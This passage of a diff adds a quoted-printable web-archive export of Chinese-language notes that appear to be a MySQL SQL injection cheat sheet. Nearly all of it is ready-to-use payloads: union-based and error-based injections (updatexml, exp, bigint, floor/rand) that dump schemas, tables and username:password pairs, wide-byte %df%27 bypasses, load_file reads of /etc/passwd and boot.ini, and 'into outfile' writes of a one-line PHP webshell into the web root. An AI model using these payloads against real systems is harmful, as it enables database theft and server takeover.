+ lang=3Den-US><span style=3D'mso-spacerun:yes'>  </span></span><span lang=
+=3Dzh-CN>用十六进制时不需要添加引号，对于一些日本韩国=
+的网站使用十六进制可以防止编码问题导致文件内容的丢=
+失。</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Den-US>Load_file('c:\\boot.ini')</span><span
+ lang=3Dzh-CN>或者</span><span lang=3Den-US>load file ('/etc/passwd') </s=
+pan><span
+ lang=3Dzh-CN>得到用户名，</span><span lang=3Den-US>file_priv</span><=
+span lang=3Dzh-CN>值为</span><span
+ lang=3Den-US>Y</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt' lang=3Den-US>system cat /etc/passwd</p>
+ <p style=3D'color:#000000;margin:0in;margin-left:.75in;line-height:25pt;
+ text-indent:-.1666in;font-family:微软雅黑;font-size:11.0pt'><img
+ src=3D"file8792.files/image004.png" width=3D16 height=3D16 alt=3D重要>&n=
+bsp;<span
+ lang=3Dzh-CN>into outfile写文件</span><span lang=3Den-US><span
+ style=3D'mso-spacerun:yes'>   </span></span><span lang=3Dzh-CN>如果注=
+入点权限较高，可以直接写入一句话到服务器而不用猜解=
+网站密码。</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>&nbsp;</span><span lang=3Den-US> 1</span><span lang=3Dzh-CN>�=
+��得物理路径</span><span
+ lang=3Den-US>(into outfile </span><span lang=3Dzh-CN>’物理路径’</s=
+pan><span
+ lang=3Den-US>) </span><span lang=3Dzh-CN>这样才能写对目录</span></=
+p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>&nbsp;</span><span lang=3Den-US> 2</span><span lang=3Dzh-CN>�=
+��够使用</span><span
+ lang=3Den-US>union (</span><span lang=3Dzh-CN>也就是说需要</span><sp=
+an lang=3Den-US>MYSQL3</span><span
+ lang=3Dzh-CN>以上的版本</span><span lang=3Den-US>)</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>&nbsp;</span><span lang=3Den-US> 3</span><span lang=3Dzh-CN>�=
+��方没有对’进行过滤</span><span
+ lang=3Den-US>(</span><span lang=3Dzh-CN>因为</span><span lang=3Den-US>ou=
+tfile </span><span
+ lang=3Dzh-CN>后面的</span><span lang=3Den-US> </span><span lang=3Dzh-CN=
+>’’</span><span
+ lang=3Den-US> </span><span lang=3Dzh-CN>不可以用其他函数代替转�=
+��</span><span lang=3Den-US>)</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>&nbsp;</span><span lang=3Den-US> 4</span><span lang=3Dzh-CN>�=
+��是</span><span
+ lang=3Den-US>MYSQL</span><span lang=3Dzh-CN>用户拥有</span><span lang=
+=3Den-US>file_priv</span><span
+ lang=3Dzh-CN>权限</span><span lang=3Den-US>(</span><span lang=3Dzh-CN>�=
+�然就不能写文件</span><span
+ lang=3Den-US> </span><span lang=3Dzh-CN>或者把文件内容读出</span>=
+<span lang=3Den-US>)</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>&nbsp;</span><span lang=3Den-US> 5</span><span lang=3Dzh-CN>�=
+��</span><span
+ lang=3Den-US>web</span><span lang=3Dzh-CN>目录有写权限</span><span l=
+ang=3Den-US>MS</span><span
+ lang=3Dzh-CN>的系统一般都有权限</span><span lang=3Den-US>,</span>=
+<span lang=3Dzh-CN>但是</span><span
+ lang=3Den-US>LINUX</span><span lang=3Dzh-CN>通常都是</span><span lang=
+=3Den-US>rwxr-xr-x </span><span
+ lang=3Dzh-CN>也就是说组跟其他用户都没有权限写操作</span>=
+<span lang=3Den-US>. </span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>union select 1,2,3,char(这里写入�=
+��转换成</span><span
+ lang=3Den-US>10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 i=
+nto outfile ‘d:\web\90.php'</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'>union select
+ 1,2,3,load_file(‘d:\web\logo123.jpg’),5,6,7,8,9,10,7 into outfile
+ ‘d:\web\90.php’</p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'>&nbsp;</p>
+ <ul type=3Ddisc style=3D'margin-left:.375in;direction:ltr;unicode-bidi:emb=
+ed;
+  margin-top:0in;margin-bottom:0in'>
+  <li style=3D'margin-top:0;margin-bottom:0;vertical-align:middle;line-heig=
+ht:
+      25pt'><span style=3D'font-family:微软雅黑;font-size:11.0pt'>错�=
+�回显闭合方式</span></li>
+ </ul>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>基于单引号闭合</span><span lan=
+g=3Den-US><span
+ style=3D'mso-spacerun:yes'>   </span></span></p>
+ <p style=3D'margin:0in;margin-left:1.125in;line-height:25pt;font-family:�=
+�软雅黑;
+ font-size:11.0pt' lang=3Den-US>'or<span style=3D'mso-spacerun:yes'>   
+ </span>sql<span style=3D'mso-spacerun:yes'>      </span>or'</p>
+ <p style=3D'margin:0in;margin-left:1.125in;line-height:25pt;font-family:�=
+�软雅黑;
+ font-size:11.0pt' lang=3Den-US>''<span style=3D'mso-spacerun:yes'>    <=
+/span>sql</p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'>基于双引号闭合</p>
+ <p style=3D'margin:0in;margin-left:1.125in;line-height:25pt;font-family:�=
+�软雅黑;
+ font-size:11.0pt' lang=3Den-US>&quot;<span style=3D'mso-spacerun:yes'> 
+ </span>sql<span style=3D'mso-spacerun:yes'>  </span>&quot;</p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:Cali=
+bri;
+ font-size:10.5pt' lang=3Den-US>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:10.5pt'>整数型的闭合</p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-size:10.5pt=
+'><span
+ style=3D'font-family:Calibri' lang=3Den-US>id</span><span style=3D'font-fa=
+mily:微软雅黑'
+ lang=3Den-US>=3D</span><span style=3D'font-family:Calibri' lang=3Dzh-CN>1 =
+AND
+ updatexml(1,concat(0x7e,(database())),0)</span></p>
+ <p style=3D'margin:0in;margin-left:1.125in;line-height:25pt;font-family:�=
+�软雅黑;
+ font-size:11.0pt' lang=3Den-US>&nbsp;</p>
+ <ul type=3Ddisc style=3D'margin-left:.375in;direction:ltr;unicode-bidi:emb=
+ed;
+  margin-top:0in;margin-bottom:0in'>
+  <li style=3D'margin-top:0;margin-bottom:0;vertical-align:middle;line-heig=
+ht:
+      25pt'><span style=3D'font-family:微软雅黑;font-size:11.0pt'>宽�=
+�节注入</span></li>
+ </ul>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Den-US>%df%27</span><span lang=3Dzh-CN>报�=
+�</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt' lang=3Den-US>%aa%27union select 1,2,3</p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'>-1%aa%27union select
+ 1,group_concat(char(60,112,62),table_name),3 from information_schema.tables
+ where table_schema=3Ddatabase()%23</p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'>Mysql编码与过滤函数推荐使用mysql_real_escape_=
+string()，mysql_set_charset()</p>
+ <ul type=3Ddisc style=3D'margin-left:.375in;direction:ltr;unicode-bidi:emb=
+ed;
+  margin-top:0in;margin-bottom:0in'>
+  <li style=3D'margin-top:0;margin-bottom:0;vertical-align:middle;line-heig=
+ht:
+      25pt'><span style=3D'font-weight:bold;font-family:微软雅黑;font-s=
+ize:11.0pt'>查询字段数</span></li>
+ </ul>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Den-US>order by 1,2,3,4,5,6<span
+ style=3D'mso-spacerun:yes'>     </span></span><span lang=3Dzh-CN>通�=
+�一次添加数字来确定字段数，原理是</span><span
+ lang=3Den-US>order</span><span lang=3Dzh-CN>根据某列的结果进行排=
+序，如果该列不存在所以会报错。</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>and (select * from t_ys168_com)=3D1</=
+span><span
+ lang=3Den-US><span style=3D'mso-spacerun:yes'>    </span></span><span l=
+ang=3Dzh-CN>通过报错注入返回表的字段数前提知道表名</span=
+><span
+ lang=3Den-US><span style=3D'mso-spacerun:yes'>  </span></span></p>
+ <ul type=3Ddisc style=3D'margin-left:.375in;direction:ltr;unicode-bidi:emb=
+ed;
+  margin-top:0in;margin-bottom:0in'>
+  <li style=3D'margin-top:0;margin-bottom:0;vertical-align:middle;line-heig=
+ht:
+      25pt'><span style=3D'font-weight:bold;font-family:微软雅黑;font-s=
+ize:11.0pt'>查找显示位</span></li>
+ </ul>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Den-US>union select 1,2,3,4,5,6 from admin--=
+<span
+ style=3D'mso-spacerun:yes'>    </span></span><span lang=3Dzh-CN>后面�=
+��加</span><span
+ lang=3Den-US>--</span><span lang=3Dzh-CN>结束语句</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>+UNION+ALL+SELECT+null,null,null,null=
+,null,null,null,null,null,null--+-</span><span
+ lang=3Den-US><span style=3D'mso-spacerun:yes'>           </span>=
+//</span><span
+ lang=3Dzh-CN>如果</span><span lang=3Den-US>oracle</span><span lang=3Dzh-=
+CN>与</span><span
+ lang=3Den-US>sql server</span><span lang=3Dzh-CN>中，列数据不明确�=
+��情况下，这种兼容性好一点。</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>1')+ORDER+BY+1</span><span lang=3Den-=
+US>0</span><span
+ lang=3Dzh-CN>%23</span><span lang=3Den-US><span style=3D'mso-spacerun:yes'=
+>     
+ </span></span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Den-US>-1')+union+select+1,2,3<span
+ style=3D'mso-spacerun:yes'>     </span></span><span lang=3Dzh-CN>基�=
+�单引号的联合查询</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>+UNION+ALL+SELECT+1,CONCAT_WS(0x203a2=
+0,USER(),DATABASE(),VERSION()),3,4,5,6,7,8</span><span
+ lang=3Den-US><span style=3D'mso-spacerun:yes'>          </span>//=
+</span><span
+ lang=3Dzh-CN>批量查询</span><span lang=3Den-US><span style=3D'mso-spac=
+erun:yes'> 
+ </span>203a20</span><span lang=3Dzh-CN>显示效果会好一些类似</spa=
+n><span lang=3Den-US>a : b </span><span
+ lang=3Dzh-CN>而不是</span><span lang=3Den-US>a:b</span></p>
+ <p style=3D'color:#000000;margin:0in;margin-left:.75in;line-height:25pt;
+ text-indent:-.1666in;font-family:微软雅黑;font-size:11.0pt'><img
+ src=3D"file8792.files/image004.png" width=3D16 height=3D16 alt=3D重要>&n=
+bsp;<span
+ lang=3Dzh-CN>通常注入的时候，在语句最后加一个</span><span =
+lang=3Den-US> -- 横杠或者 /* 注释符，结束后面的语句</span></=
+p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Den-US>id=3D-1 </span><span lang=3Dzh-CN>一=
+般联合查询时，如果前面出错则会执行后面的语句与</span=
+><span
+ lang=3Den-US>and 1=3D2</span><span lang=3Dzh-CN>类似</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>在注入的时候最好在数据库�=
+��名字上加上反斜杠</span><span
+ lang=3Den-US>`db`</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>联合查询</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>union select 1,2,3,4,5,6 from adm=
+in--<span
+ style=3D'mso-spacerun:yes'>    </span>后面添加--结束语句</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>   
+ </span>+UNION+ALL+SELECT+null,null,null,null,null,null,null,null,null,null=
+--+-<span
+ style=3D'mso-spacerun:yes'>         
+ </span>//如果oracle与sqlserver中，列数据不明确的情况下，�=
+�种兼容性好一点。</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>1')+ORDER+BY+10%23</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>-1')+union+select+1,2,3<span
+ style=3D'mso-spacerun:yes'>     </span>基于单引号的联合查询<=
+/p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>   
+ </span>+UNION+ALL+SELECT+1,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION())=
+,3,4,5,6,7,8<span
+ style=3D'mso-spacerun:yes'>          </span>//批量查询<span
+ style=3D'mso-spacerun:yes'>  </span>203a20显示效果会好一些类似a=
+ : b 而不是a:b</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>通常注入的时候，在语句=
+最后加一个 -- 横杠或者 /* 注释符，结束后面的语句</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>id=3D-1 一般联合查询时，�=
+��果前面出错则会执行后面的语句与and 1=3D2类似</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>在注入的时候最好在数据=
+库的名字上加上反斜杠`db`</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>union select 1,schema_name,3,4 fr=
+om
+ information_schema.schemata limit 1,1/*</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>union select
+ 1,group_concat(schema_name),3,4 from information_schema.schemata/*</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>union select
+ 1,group_concat(char(60,112,62),table_name),3,4,5,6 from
+ information_schema.tables where table_schema=3Ddatabase()</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>union select 1,2,3,table_name fro=
+m (select
+ * from information_schema.tables where table_schema =3D 数据库名字的=
+ hex order by
+ table_schema limit 6,1)</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>   
+ </span>union+select+1,2,column_name,4,5+from+(select+*+from+information_sc=
+hema.columns+where+table_name=3D表的十六进制0x61646D696E6973747261746=
+F72+and+table_schema=3D数据库的十六进制0x796B7873676F76+order+by+1+=
+limit+2,1)t+limit+1--</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>and 1=3D2 union select
+ 1,2,3,4,group_concat(char(60,112,62)，column_name),5,6,7 from
+ information_schema.columns where table_name=3D表名的十六进制编码 =
+and
+ table_schema=3D数据库的16进制编码</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>and 1=3D2 union select
+ 1,2,group_concat(username,0x3a,password),database(),user(), 6,7,8,9 from �=
+��据库.表</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>子查询报错</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-size:11.0pt'><span
+ style=3D'font-family:微软雅黑' lang=3Dzh-CN><span style=3D'mso-spaceru=
+n:yes'>   
+ </span>无版本限制 有字符限制（</span><span style=3D'font-family=
+:Calibri' lang=3Den-US>52</span><span
+ style=3D'font-family:微软雅黑' lang=3Dzh-CN>个显示字符） 有时�=
+��可以爆出一些中文与符号</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>错误回显：1062 - Duplicate e=
+ntry 'xxx' for key
+ 'group_key'</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>   
+ </span>or%20(select%201%20from%20(select%20count(*),concat((SELECT%20conca=
+t(user(),0x7c,database(),0x7c,version())),floor(rand(0)*2))x%20from%20infor=
+mation_schema.tables%20group%20by%20x)k)%23<span
+ style=3D'mso-spacerun:yes'>      </span>//通过子查询获取数据=
+库，用户名，版本等等</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>or (SELECT 1 FROM(SELECT
+ count(*),concat((SELECT (SELECT (SELECT distinct
+ concat(0x7e,0x27,cast(table_name as char),0x27,0x7e) FROM
+ information_schema.tables WHERE table_schema=3Ddatabase() LIMIT 0,1)) FROM
+ information_schema.tables limit 1,1),floor(rand(0)*2))x FROM
+ information_schema.columns group by x)a)%23<span style=3D'mso-spacerun:yes=
+'>  
+ </span>查询表名</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>or (SELECT 1 FROM(SELECT
+ count(*),concat((SELECT (SELECT (SELECT distinct
+ concat(0x7e,0x27,cast(column_name as char),0x27,0x7e) FROM
+ information_schema.columns WHERE table_schema=3Ddatabase() AND
+ table_name=3D'users' LIMIT 0,1)) FROM information_schema.tables limit
+ 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a)<span
+ style=3D'mso-spacerun:yes'>     </span>查询字段</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>or (SELECT 1 FROM(SELECT
+ count(*),concat((SELECT (SELECT (SELECT concat(0x7e,0x27,cast(pass as
+ char),0x27,0x7e) FROM users LIMIT 1,1) ) FROM information_schema.tables li=
+mit
+ 1,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a)<span
+ style=3D'mso-spacerun:yes'>    </span>获取内容</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>updatexml报错</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>有字符限制一般显示32位�=
+��配合substr/mysql &gt;5.0</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>错误回显：1105 - XPATH synta=
+x error</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>' or
+ updatexml(1,concat(0x7e,(database())),0) or '<span
+ style=3D'mso-spacerun:yes'>        </span>//报错注入有时候�=
+�合使用这种格式<span
+ style=3D'mso-spacerun:yes'>   </span>id=3D''or updatexml()<span
+ style=3D'mso-spacerun:yes'>   </span>查询数据库</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>updatexml(0,concat(0x7e,(SELECT
+ concat(table_name) FROM information_schema.tables WHERE
+ table_schema=3Ddatabase() limit 0,1)),0)<span style=3D'mso-spacerun:yes'>�=
+� 
+ </span>查询表</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>updatexml(0,concat(0x7e,(SELECT
+ concat(column_name) FROM information_schema.columns WHERE table_name=3D'us=
+ers'
+ limit 1,1)),0)<span style=3D'mso-spacerun:yes'>    </span>查询字段<=
+/p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>updatexml(0,concat(0x7e,(SELECT
+ concat_ws(':',name,pass) FROM xx.users limit 1,1)),0)<span
+ style=3D'mso-spacerun:yes'>       </span>获取内容</p>
+ <p style=3D'margin:0in;margin-left:1.125in;font-family:微软雅黑;font-s=
+ize:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>exp报错</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>mysql &gt;5.5<span
+ style=3D'mso-spacerun:yes'>  </span>可以爆出多行<span style=3D'mso-=
+spacerun:yes'> 
+ </span>文件可取多行</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>错误回显：1690 - DOUBLE valu=
+e is out of range
+ in</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>exp(~(select*from(select database=
+())x))</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>exp(~(select*from(select table_na=
+me from
+ information_schema.tables where table_schema=3Ddatabase() limit 0,1)x))</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>exp(~(select*from(select column_n=
+ame from
+ information_schema.columns where table_name=3D'users' limit 0,1)x))</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>exp(~ (select*from(select
+ concat_ws(':',id, username, password) from users limit 0,1)x))</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-size:11.0pt'><span
+ style=3D'font-family:Calibri' lang=3Den-US><span style=3D'mso-spacerun:yes=
+'>    
+ </span></span><span style=3D'font-family:微软雅黑' lang=3Dzh-CN>exp(~(=
+select*from(select(concat(@:=3D0,(select
+ count(*)from`information_schema`.columns where
+ table_schema=3Ddatabase()and@:=3Dconcat(@,0xa,table_schema,0x3a3a,table_na=
+me,0x3a3a,column_name)),@)))x))<span
+ style=3D'mso-spacerun:yes'>    </span>//获取所有数据</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>bigint报错（mysql&gt;5.5
+ 可一次爆出多行<span style=3D'mso-spacerun:yes'>  </span>文件可�=
+��多行）</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>错误回显：BIGINT UNSIGNED va=
+lue is out of range
+ in</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>   
+ </span>and(select!x-~0.+from(select(select+group_concat(Version()))x)x)</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>   
+ </span>and(select!x-~0.+from(select(select+group_concat(char(60,112,62),ta=
+ble_name)from+information_schema.tables+where+table_schema=3Ddatabase())x)x=
+)</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>   
+ </span>and(select!x-~0.+from(select(select+group_concat(char(60,112,62),ta=
+ble_name)from+information_schema.columns+where+table_name=3D0x7573657273+AN=
+D+table_schema=3Ddatabase())x)x)</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>   
+ </span>and(select!x-~0.+from(select(select+group_concat(char(60,112,62),us=
+ername,0x203a20,password)from+security.users)x)x)</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>double
+ query based</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>-1 or 1 group by
+ concat_ws(0x3a,version(),database(),floor(rand(0)*2)) having min(0) or 1--=
+</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>    </span>-1 or 1 group by concat(0x7e,(sel=
+ect
+ concat(table_name) from information_schema.tables limit 0,1),floor(rand(0)=
+*2))
+ having min(0) or 1--</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>   
+ </span>1+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+CONCAT(C=
+AST(VERSION()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLO=
+OR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=3D1</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>   
+ </span>1+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+=
+DISTINCT+CONCAT(0x7e,0x27,CAST(schema_name+AS+CHAR),0x27,0x7e)+FROM+INFORMA=
+TION_SCHEMA.SCHEMATA+WHERE+table_schema!=3DDATABASE()+LIMIT+1,1))+FROM+INFO=
+RMATION_SCHEMA.TABLES+LIMIT+0,1),+FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEM=
+A.TABLES+GROUP+BY+x)a)+AND+1=3D1</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ style=3D'mso-spacerun:yes'>   
+ </span>1+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+=
+DISTINCT+CONCAT(0x7e,0x27,CAST(table_name+AS+CHAR),0x27,0x7e)+FROM+INFORMAT=
+ION_SCHEMA.TABLES+WHERE+table_schema=3DDATABASE()+LIMIT+0,1))+FROM+INFORMAT=
+ION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TAB=
+LES+GROUP+BY+x)a)+AND+1=3D1</p>
